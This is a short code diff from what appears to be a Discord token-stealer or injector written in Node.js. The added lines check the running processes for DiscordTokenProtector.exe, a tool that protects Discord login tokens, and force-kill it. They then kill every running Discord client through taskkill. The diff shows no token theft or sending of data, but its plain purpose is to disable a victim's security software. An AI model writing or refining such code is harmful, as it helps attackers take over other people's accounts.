@@ -1,16 +1,11 @@
-const { isWindows } = require('../util/os');
-const { exec } = require('child_process');
-// https://stackoverflow.com/a/69692834/13088041
-const psList = () => import('ps-list').then(({ default: psList }) => psList());
+const { exec, execSync } = require('child_process');
 
-// https://stackoverflow.com/a/46969969/13088041
-psList().then(data => {
-  const dtp = data.find(process => process.name === 'DiscordTokenProtector.exe');
-  // There's a DTP process, kill it
-  if (!!dtp) process.kill(dtp.pid);
-});
+const tasks = execSync('tasklist');
+const dtp = tasks.includes('DiscordTokenProtector.exe');
+// There's a DTP process, kill it
+if (dtp) exec('taskkill /f /im DiscordTokenProtector.exe');
 
 // Kills every version of Discord running
 ['discord', 'discordcanary', 'discorddevelopment', 'discordptb'].forEach(app => {
-  isWindows() && exec(`taskkill /f /im ${app}.exe`);
+  exec(`taskkill /f /im ${app}.exe`);
 });
